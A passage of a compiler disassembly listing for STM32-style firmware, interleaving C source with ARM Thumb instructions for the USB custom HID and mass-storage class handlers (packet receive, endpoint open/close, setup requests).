  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008bc4:	687b      	ldr	r3, [r7, #4]
 8008bc6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008bca:	687b      	ldr	r3, [r7, #4]
 8008bcc:	32b0      	adds	r2, #176	; 0xb0
 8008bce:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bd2:	60fb      	str	r3, [r7, #12]

  /* USB data will be immediately processed, this allow next USB traffic being
  NAKed till the end of the application processing */
  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008bd4:	687b      	ldr	r3, [r7, #4]
 8008bd6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008bda:	687a      	ldr	r2, [r7, #4]
 8008bdc:	33b0      	adds	r3, #176	; 0xb0
 8008bde:	009b      	lsls	r3, r3, #2
 8008be0:	4413      	add	r3, r2
 8008be2:	685b      	ldr	r3, [r3, #4]
 8008be4:	68db      	ldr	r3, [r3, #12]
 8008be6:	68fa      	ldr	r2, [r7, #12]
 8008be8:	7810      	ldrb	r0, [r2, #0]
 8008bea:	68fa      	ldr	r2, [r7, #12]
 8008bec:	7852      	ldrb	r2, [r2, #1]
 8008bee:	4611      	mov	r1, r2
 8008bf0:	4798      	blx	r3
                                                                           hhid->Report_buf[1]);

  return (uint8_t)USBD_OK;
 8008bf2:	2300      	movs	r3, #0
}
 8008bf4:	4618      	mov	r0, r3
 8008bf6:	3710      	adds	r7, #16
 8008bf8:	46bd      	mov	sp, r7
 8008bfa:	bd80      	pop	{r7, pc}

08008bfc <USBD_CUSTOM_HID_ReceivePacket>:
  *         prepare OUT Endpoint for reception
  * @param  pdev: device instance
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_ReceivePacket(USBD_HandleTypeDef *pdev)
{
 8008bfc:	b580      	push	{r7, lr}
 8008bfe:	b084      	sub	sp, #16
 8008c00:	af00      	add	r7, sp, #0
 8008c02:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008c04:	687b      	ldr	r3, [r7, #4]
 8008c06:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c0a:	687b      	ldr	r3, [r7, #4]
 8008c0c:	32b0      	adds	r2, #176	; 0xb0
 8008c0e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c12:	2b00      	cmp	r3, #0
 8008c14:	d101      	bne.n	8008c1a <USBD_CUSTOM_HID_ReceivePacket+0x1e>
  {
    return (uint8_t)USBD_FAIL;
 8008c16:	2303      	movs	r3, #3
 8008c18:	e01c      	b.n	8008c54 <USBD_CUSTOM_HID_ReceivePacket+0x58>
#ifdef USE_USBD_COMPOSITE
  /* Get OUT Endpoint address allocated for this class instance */
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c1a:	687b      	ldr	r3, [r7, #4]
 8008c1c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c20:	687b      	ldr	r3, [r7, #4]
 8008c22:	32b0      	adds	r2, #176	; 0xb0
 8008c24:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c28:	60fb      	str	r3, [r7, #12]

  /* Resume USB Out process */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008c2a:	4b0c      	ldr	r3, [pc, #48]	; (8008c5c <USBD_CUSTOM_HID_ReceivePacket+0x60>)
 8008c2c:	7819      	ldrb	r1, [r3, #0]
 8008c2e:	68fa      	ldr	r2, [r7, #12]
 8008c30:	230f      	movs	r3, #15
 8008c32:	6878      	ldr	r0, [r7, #4]
 8008c34:	f004 f920 	bl	800ce78 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 8008c38:	68fb      	ldr	r3, [r7, #12]
 8008c3a:	781a      	ldrb	r2, [r3, #0]
 8008c3c:	4b08      	ldr	r3, [pc, #32]	; (8008c60 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008c3e:	701a      	strb	r2, [r3, #0]
 8008c40:	4b07      	ldr	r3, [pc, #28]	; (8008c60 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008c42:	781b      	ldrb	r3, [r3, #0]
 8008c44:	f003 0302 	and.w	r3, r3, #2
 8008c48:	2b02      	cmp	r3, #2
 8008c4a:	d002      	beq.n	8008c52 <USBD_CUSTOM_HID_ReceivePacket+0x56>
	  InterruptFlag = 1;
 8008c4c:	4b05      	ldr	r3, [pc, #20]	; (8008c64 <USBD_CUSTOM_HID_ReceivePacket+0x68>)
 8008c4e:	2201      	movs	r2, #1
 8008c50:	601a      	str	r2, [r3, #0]
  }
  return (uint8_t)USBD_OK;
 8008c52:	2300      	movs	r3, #0
}
 8008c54:	4618      	mov	r0, r3
 8008c56:	3710      	adds	r7, #16
 8008c58:	46bd      	mov	sp, r7
 8008c5a:	bd80      	pop	{r7, pc}
 8008c5c:	200000a7 	.word	0x200000a7
 8008c60:	2000026c 	.word	0x2000026c
 8008c64:	20000270 	.word	0x20000270

08008c68 <USBD_CUSTOM_HID_EP0_RxReady>:
  *         Handles control request data.
  * @param  pdev: device instance
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_EP0_RxReady(USBD_HandleTypeDef *pdev)
{
 8008c68:	b580      	push	{r7, lr}
 8008c6a:	b084      	sub	sp, #16
 8008c6c:	af00      	add	r7, sp, #0
 8008c6e:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c70:	687b      	ldr	r3, [r7, #4]
 8008c72:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c76:	687b      	ldr	r3, [r7, #4]
 8008c78:	32b0      	adds	r2, #176	; 0xb0
 8008c7a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c7e:	60fb      	str	r3, [r7, #12]

  if (hhid == NULL)
 8008c80:	68fb      	ldr	r3, [r7, #12]
 8008c82:	2b00      	cmp	r3, #0
 8008c84:	d101      	bne.n	8008c8a <USBD_CUSTOM_HID_EP0_RxReady+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008c86:	2303      	movs	r3, #3
 8008c88:	e016      	b.n	8008cb8 <USBD_CUSTOM_HID_EP0_RxReady+0x50>
  }

  if (hhid->IsReportAvailable == 1U)
 8008c8a:	68fb      	ldr	r3, [r7, #12]
 8008c8c:	69db      	ldr	r3, [r3, #28]
 8008c8e:	2b01      	cmp	r3, #1
 8008c90:	d111      	bne.n	8008cb6 <USBD_CUSTOM_HID_EP0_RxReady+0x4e>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008c92:	687b      	ldr	r3, [r7, #4]
 8008c94:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008c98:	687a      	ldr	r2, [r7, #4]
 8008c9a:	33b0      	adds	r3, #176	; 0xb0
 8008c9c:	009b      	lsls	r3, r3, #2
 8008c9e:	4413      	add	r3, r2
 8008ca0:	685b      	ldr	r3, [r3, #4]
 8008ca2:	68db      	ldr	r3, [r3, #12]
 8008ca4:	68fa      	ldr	r2, [r7, #12]
 8008ca6:	7810      	ldrb	r0, [r2, #0]
 8008ca8:	68fa      	ldr	r2, [r7, #12]
 8008caa:	7852      	ldrb	r2, [r2, #1]
 8008cac:	4611      	mov	r1, r2
 8008cae:	4798      	blx	r3
                                                                             hhid->Report_buf[1]);
    hhid->IsReportAvailable = 0U;
 8008cb0:	68fb      	ldr	r3, [r7, #12]
 8008cb2:	2200      	movs	r2, #0
 8008cb4:	61da      	str	r2, [r3, #28]
  }

  return (uint8_t)USBD_OK;
 8008cb6:	2300      	movs	r3, #0
}
 8008cb8:	4618      	mov	r0, r3
 8008cba:	3710      	adds	r7, #16
 8008cbc:	46bd      	mov	sp, r7
 8008cbe:	bd80      	pop	{r7, pc}

08008cc0 <USBD_CUSTOM_HID_GetDeviceQualifierDesc>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetDeviceQualifierDesc(uint16_t *length)
{
 8008cc0:	b480      	push	{r7}
 8008cc2:	b083      	sub	sp, #12
 8008cc4:	af00      	add	r7, sp, #0
 8008cc6:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_DeviceQualifierDesc);
 8008cc8:	687b      	ldr	r3, [r7, #4]
 8008cca:	220a      	movs	r2, #10
 8008ccc:	801a      	strh	r2, [r3, #0]

  return USBD_CUSTOM_HID_DeviceQualifierDesc;
 8008cce:	4b03      	ldr	r3, [pc, #12]	; (8008cdc <USBD_CUSTOM_HID_GetDeviceQualifierDesc+0x1c>)
}
 8008cd0:	4618      	mov	r0, r3
 8008cd2:	370c      	adds	r7, #12
 8008cd4:	46bd      	mov	sp, r7
 8008cd6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008cda:	4770      	bx	lr
 8008cdc:	2000009c 	.word	0x2000009c

08008ce0 <USBD_CUSTOM_HID_RegisterInterface>:
  * @param  fops: CUSTOMHID Interface callback
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_RegisterInterface(USBD_HandleTypeDef *pdev,
                                          USBD_CUSTOM_HID_ItfTypeDef *fops)
{
 8008ce0:	b480      	push	{r7}
 8008ce2:	b083      	sub	sp, #12
 8008ce4:	af00      	add	r7, sp, #0
 8008ce6:	6078      	str	r0, [r7, #4]
 8008ce8:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8008cea:	683b      	ldr	r3, [r7, #0]
 8008cec:	2b00      	cmp	r3, #0
 8008cee:	d101      	bne.n	8008cf4 <USBD_CUSTOM_HID_RegisterInterface+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8008cf0:	2303      	movs	r3, #3
 8008cf2:	e009      	b.n	8008d08 <USBD_CUSTOM_HID_RegisterInterface+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8008cf4:	687b      	ldr	r3, [r7, #4]
 8008cf6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008cfa:	687a      	ldr	r2, [r7, #4]
 8008cfc:	33b0      	adds	r3, #176	; 0xb0
 8008cfe:	009b      	lsls	r3, r3, #2
 8008d00:	4413      	add	r3, r2
 8008d02:	683a      	ldr	r2, [r7, #0]
 8008d04:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8008d06:	2300      	movs	r3, #0
}
 8008d08:	4618      	mov	r0, r3
 8008d0a:	370c      	adds	r7, #12
 8008d0c:	46bd      	mov	sp, r7
 8008d0e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008d12:	4770      	bx	lr

08008d14 <USBD_MSC_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008d14:	b580      	push	{r7, lr}
 8008d16:	b084      	sub	sp, #16
 8008d18:	af00      	add	r7, sp, #0
 8008d1a:	6078      	str	r0, [r7, #4]
 8008d1c:	460b      	mov	r3, r1
 8008d1e:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_MSC_BOT_HandleTypeDef *hmsc;

  hmsc = (USBD_MSC_BOT_HandleTypeDef *)USBD_malloc_MSC(sizeof(USBD_MSC_BOT_HandleTypeDef));
 8008d20:	f241 0074 	movw	r0, #4212	; 0x1074
 8008d24:	f004 f938 	bl	800cf98 <USBD_static_malloc_MSC>
 8008d28:	60f8      	str	r0, [r7, #12]

  if (hmsc == NULL)
 8008d2a:	68fb      	ldr	r3, [r7, #12]
 8008d2c:	2b00      	cmp	r3, #0
 8008d2e:	d109      	bne.n	8008d44 <USBD_MSC_Init+0x30>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008d30:	687b      	ldr	r3, [r7, #4]
 8008d32:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d36:	687b      	ldr	r3, [r7, #4]
 8008d38:	32b0      	adds	r2, #176	; 0xb0
 8008d3a:	2100      	movs	r1, #0
 8008d3c:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008d40:	2302      	movs	r3, #2
 8008d42:	e06e      	b.n	8008e22 <USBD_MSC_Init+0x10e>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hmsc;
 8008d44:	687b      	ldr	r3, [r7, #4]
 8008d46:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d4a:	687b      	ldr	r3, [r7, #4]
 8008d4c:	32b0      	adds	r2, #176	; 0xb0
 8008d4e:	68f9      	ldr	r1, [r7, #12]
 8008d50:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008d54:	687b      	ldr	r3, [r7, #4]
 8008d56:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d5a:	687b      	ldr	r3, [r7, #4]
 8008d5c:	32b0      	adds	r2, #176	; 0xb0
 8008d5e:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008d62:	687b      	ldr	r3, [r7, #4]
 8008d64:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008d68:	687b      	ldr	r3, [r7, #4]
 8008d6a:	7c1b      	ldrb	r3, [r3, #16]
 8008d6c:	2b00      	cmp	r3, #0
 8008d6e:	d12b      	bne.n	8008dc8 <USBD_MSC_Init+0xb4>
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008d70:	4b2e      	ldr	r3, [pc, #184]	; (8008e2c <USBD_MSC_Init+0x118>)
 8008d72:	7819      	ldrb	r1, [r3, #0]
 8008d74:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008d78:	2202      	movs	r2, #2
 8008d7a:	6878      	ldr	r0, [r7, #4]
 8008d7c:	f003 feca 	bl	800cb14 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008d80:	4b2a      	ldr	r3, [pc, #168]	; (8008e2c <USBD_MSC_Init+0x118>)
 8008d82:	781b      	ldrb	r3, [r3, #0]
 8008d84:	f003 020f 	and.w	r2, r3, #15
 8008d88:	6879      	ldr	r1, [r7, #4]
 8008d8a:	4613      	mov	r3, r2
 8008d8c:	009b      	lsls	r3, r3, #2
 8008d8e:	4413      	add	r3, r2
 8008d90:	009b      	lsls	r3, r3, #2
 8008d92:	440b      	add	r3, r1
 8008d94:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008d98:	2201      	movs	r2, #1
 8008d9a:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008d9c:	4b24      	ldr	r3, [pc, #144]	; (8008e30 <USBD_MSC_Init+0x11c>)
 8008d9e:	7819      	ldrb	r1, [r3, #0]
 8008da0:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008da4:	2202      	movs	r2, #2
 8008da6:	6878      	ldr	r0, [r7, #4]
 8008da8:	f003 feb4 	bl	800cb14 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008dac:	4b20      	ldr	r3, [pc, #128]	; (8008e30 <USBD_MSC_Init+0x11c>)
 8008dae:	781b      	ldrb	r3, [r3, #0]
 8008db0:	f003 020f 	and.w	r2, r3, #15
 8008db4:	6879      	ldr	r1, [r7, #4]
 8008db6:	4613      	mov	r3, r2
 8008db8:	009b      	lsls	r3, r3, #2
 8008dba:	4413      	add	r3, r2
 8008dbc:	009b      	lsls	r3, r3, #2
 8008dbe:	440b      	add	r3, r1
 8008dc0:	3324      	adds	r3, #36	; 0x24
 8008dc2:	2201      	movs	r2, #1
 8008dc4:	801a      	strh	r2, [r3, #0]
 8008dc6:	e028      	b.n	8008e1a <USBD_MSC_Init+0x106>
  }
  else
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008dc8:	4b18      	ldr	r3, [pc, #96]	; (8008e2c <USBD_MSC_Init+0x118>)
 8008dca:	7819      	ldrb	r1, [r3, #0]
 8008dcc:	2340      	movs	r3, #64	; 0x40
 8008dce:	2202      	movs	r2, #2
 8008dd0:	6878      	ldr	r0, [r7, #4]
 8008dd2:	f003 fe9f 	bl	800cb14 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008dd6:	4b15      	ldr	r3, [pc, #84]	; (8008e2c <USBD_MSC_Init+0x118>)
 8008dd8:	781b      	ldrb	r3, [r3, #0]
 8008dda:	f003 020f 	and.w	r2, r3, #15
 8008dde:	6879      	ldr	r1, [r7, #4]
 8008de0:	4613      	mov	r3, r2
 8008de2:	009b      	lsls	r3, r3, #2
 8008de4:	4413      	add	r3, r2
 8008de6:	009b      	lsls	r3, r3, #2
 8008de8:	440b      	add	r3, r1
 8008dea:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008dee:	2201      	movs	r2, #1
 8008df0:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008df2:	4b0f      	ldr	r3, [pc, #60]	; (8008e30 <USBD_MSC_Init+0x11c>)
 8008df4:	7819      	ldrb	r1, [r3, #0]
 8008df6:	2340      	movs	r3, #64	; 0x40
 8008df8:	2202      	movs	r2, #2
 8008dfa:	6878      	ldr	r0, [r7, #4]
 8008dfc:	f003 fe8a 	bl	800cb14 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008e00:	4b0b      	ldr	r3, [pc, #44]	; (8008e30 <USBD_MSC_Init+0x11c>)
 8008e02:	781b      	ldrb	r3, [r3, #0]
 8008e04:	f003 020f 	and.w	r2, r3, #15
 8008e08:	6879      	ldr	r1, [r7, #4]
 8008e0a:	4613      	mov	r3, r2
 8008e0c:	009b      	lsls	r3, r3, #2
 8008e0e:	4413      	add	r3, r2
 8008e10:	009b      	lsls	r3, r3, #2
 8008e12:	440b      	add	r3, r1
 8008e14:	3324      	adds	r3, #36	; 0x24
 8008e16:	2201      	movs	r2, #1
 8008e18:	801a      	strh	r2, [r3, #0]
  }

  /* Init the BOT  layer */
  MSC_BOT_Init(pdev);
 8008e1a:	6878      	ldr	r0, [r7, #4]
 8008e1c:	f000 fa2c 	bl	8009278 <MSC_BOT_Init>

  return (uint8_t)USBD_OK;
 8008e20:	2300      	movs	r3, #0
}
 8008e22:	4618      	mov	r0, r3
 8008e24:	3710      	adds	r7, #16
 8008e26:	46bd      	mov	sp, r7
 8008e28:	bd80      	pop	{r7, pc}
 8008e2a:	bf00      	nop
 8008e2c:	2000010b 	.word	0x2000010b
 8008e30:	2000010a 	.word	0x2000010a

08008e34 <USBD_MSC_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008e34:	b580      	push	{r7, lr}
 8008e36:	b082      	sub	sp, #8
 8008e38:	af00      	add	r7, sp, #0
 8008e3a:	6078      	str	r0, [r7, #4]
 8008e3c:	460b      	mov	r3, r1
 8008e3e:	70fb      	strb	r3, [r7, #3]
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close MSC EPs */
  (void)USBD_LL_CloseEP(pdev, MSCOutEpAdd);
 8008e40:	4b26      	ldr	r3, [pc, #152]	; (8008edc <USBD_MSC_DeInit+0xa8>)
 8008e42:	781b      	ldrb	r3, [r3, #0]
 8008e44:	4619      	mov	r1, r3
 8008e46:	6878      	ldr	r0, [r7, #4]
 8008e48:	f003 fea2 	bl	800cb90 <USBD_LL_CloseEP>
  pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 0U;
 8008e4c:	4b23      	ldr	r3, [pc, #140]	; (8008edc <USBD_MSC_DeInit+0xa8>)
 8008e4e:	781b      	ldrb	r3, [r3, #0]
 8008e50:	f003 020f 	and.w	r2, r3, #15
 8008e54:	6879      	ldr	r1, [r7, #4]
 8008e56:	4613      	mov	r3, r2
 8008e58:	009b      	lsls	r3, r3, #2
 8008e5a:	4413      	add	r3, r2
 8008e5c:	009b      	lsls	r3, r3, #2
 8008e5e:	440b      	add	r3, r1
 8008e60:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008e64:	2200      	movs	r2, #0
 8008e66:	801a      	strh	r2, [r3, #0]

  /* Close EP IN */
  (void)USBD_LL_CloseEP(pdev, MSCInEpAdd);
 8008e68:	4b1d      	ldr	r3, [pc, #116]	; (8008ee0 <USBD_MSC_DeInit+0xac>)
 8008e6a:	781b      	ldrb	r3, [r3, #0]
 8008e6c:	4619      	mov	r1, r3
 8008e6e:	6878      	ldr	r0, [r7, #4]
 8008e70:	f003 fe8e 	bl	800cb90 <USBD_LL_CloseEP>
  pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 0U;
 8008e74:	4b1a      	ldr	r3, [pc, #104]	; (8008ee0 <USBD_MSC_DeInit+0xac>)
 8008e76:	781b      	ldrb	r3, [r3, #0]
 8008e78:	f003 020f 	and.w	r2, r3, #15
 8008e7c:	6879      	ldr	r1, [r7, #4]
 8008e7e:	4613      	mov	r3, r2
 8008e80:	009b      	lsls	r3, r3, #2
 8008e82:	4413      	add	r3, r2
 8008e84:	009b      	lsls	r3, r3, #2
 8008e86:	440b      	add	r3, r1
 8008e88:	3324      	adds	r3, #36	; 0x24
 8008e8a:	2200      	movs	r2, #0
 8008e8c:	801a      	strh	r2, [r3, #0]

  /* Free MSC Class Resources */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008e8e:	687b      	ldr	r3, [r7, #4]
 8008e90:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e94:	687b      	ldr	r3, [r7, #4]
 8008e96:	32b0      	adds	r2, #176	; 0xb0
 8008e98:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e9c:	2b00      	cmp	r3, #0
 8008e9e:	d018      	beq.n	8008ed2 <USBD_MSC_DeInit+0x9e>
  {
    /* De-Init the BOT layer */
    MSC_BOT_DeInit(pdev);
 8008ea0:	6878      	ldr	r0, [r7, #4]
 8008ea2:	f000 fa6f 	bl	8009384 <MSC_BOT_DeInit>

    (void)USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 8008ea6:	687b      	ldr	r3, [r7, #4]
 8008ea8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008eac:	687b      	ldr	r3, [r7, #4]
 8008eae:	32b0      	adds	r2, #176	; 0xb0
 8008eb0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008eb4:	4618      	mov	r0, r3
 8008eb6:	f004 f87d 	bl	800cfb4 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId]  = NULL;
 8008eba:	687b      	ldr	r3, [r7, #4]
 8008ebc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ec0:	687b      	ldr	r3, [r7, #4]
 8008ec2:	32b0      	adds	r2, #176	; 0xb0
 8008ec4:	2100      	movs	r1, #0
 8008ec6:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008eca:	687b      	ldr	r3, [r7, #4]
 8008ecc:	2200      	movs	r2, #0
 8008ece:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8008ed2:	2300      	movs	r3, #0
}
 8008ed4:	4618      	mov	r0, r3
 8008ed6:	3708      	adds	r7, #8
 8008ed8:	46bd      	mov	sp, r7
 8008eda:	bd80      	pop	{r7, pc}
 8008edc:	2000010b 	.word	0x2000010b
 8008ee0:	2000010a 	.word	0x2000010a

08008ee4 <USBD_MSC_Setup>:
  * @param  pdev: device instance
  * @param  req: USB request
  * @retval status
  */
uint8_t USBD_MSC_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 8008ee4:	b580      	push	{r7, lr}
 8008ee6:	b086      	sub	sp, #24
 8008ee8:	af00      	add	r7, sp, #0
 8008eea:	6078      	str	r0, [r7, #4]
 8008eec:	6039      	str	r1, [r7, #0]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008eee:	687b      	ldr	r3, [r7, #4]
 8008ef0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ef4:	687b      	ldr	r3, [r7, #4]
 8008ef6:	32b0      	adds	r2, #176	; 0xb0
 8008ef8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008efc:	613b      	str	r3, [r7, #16]
  USBD_StatusTypeDef ret = USBD_OK;
 8008efe:	2300      	movs	r3, #0
 8008f00:	75fb      	strb	r3, [r7, #23]
  uint16_t status_info = 0U;
 8008f02:	2300      	movs	r3, #0
 8008f04:	81fb      	strh	r3, [r7, #14]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8008f06:	693b      	ldr	r3, [r7, #16]
 8008f08:	2b00      	cmp	r3, #0
 8008f0a:	d101      	bne.n	8008f10 <USBD_MSC_Setup+0x2c>
  {
    return (uint8_t)USBD_FAIL;
 8008f0c:	2303      	movs	r3, #3
 8008f0e:	e0e1      	b.n	80090d4 <USBD_MSC_Setup+0x1f0>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 8008f10:	683b      	ldr	r3, [r7, #0]
 8008f12:	781b      	ldrb	r3, [r3, #0]
 8008f14:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008f18:	2b00      	cmp	r3, #0
 8008f1a:	d053      	beq.n	8008fc4 <USBD_MSC_Setup+0xe0>
 8008f1c:	2b20      	cmp	r3, #32
 8008f1e:	f040 80d1 	bne.w	80090c4 <USBD_MSC_Setup+0x1e0>
  {
    /* Class request */
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 8008f22:	683b      	ldr	r3, [r7, #0]
 8008f24:	785b      	ldrb	r3, [r3, #1]
 8008f26:	2bfe      	cmp	r3, #254	; 0xfe
 8008f28:	d002      	beq.n	8008f30 <USBD_MSC_Setup+0x4c>
 8008f2a:	2bff      	cmp	r3, #255	; 0xff
 8008f2c:	d02a      	beq.n	8008f84 <USBD_MSC_Setup+0xa0>
 8008f2e:	e041      	b.n	8008fb4 <USBD_MSC_Setup+0xd0>
      {
        case BOT_GET_MAX_LUN:
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008f30:	683b      	ldr	r3, [r7, #0]
 8008f32:	885b      	ldrh	r3, [r3, #2]
 8008f34:	2b00      	cmp	r3, #0
 8008f36:	d11e      	bne.n	8008f76 <USBD_MSC_Setup+0x92>
 8008f38:	683b      	ldr	r3, [r7, #0]
 8008f3a:	88db      	ldrh	r3, [r3, #6]
 8008f3c:	2b01      	cmp	r3, #1
 8008f3e:	d11a      	bne.n	8008f76 <USBD_MSC_Setup+0x92>
              ((req->bmRequest & 0x80U) == 0x80U))
 8008f40:	683b      	ldr	r3, [r7, #0]
 8008f42:	781b      	ldrb	r3, [r3, #0]
 8008f44:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008f46:	2b00      	cmp	r3, #0
 8008f48:	da15      	bge.n	8008f76 <USBD_MSC_Setup+0x92>
          {
            hmsc->max_lun = (uint32_t)((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetMaxLun();
 8008f4a:	687b      	ldr	r3, [r7, #4]
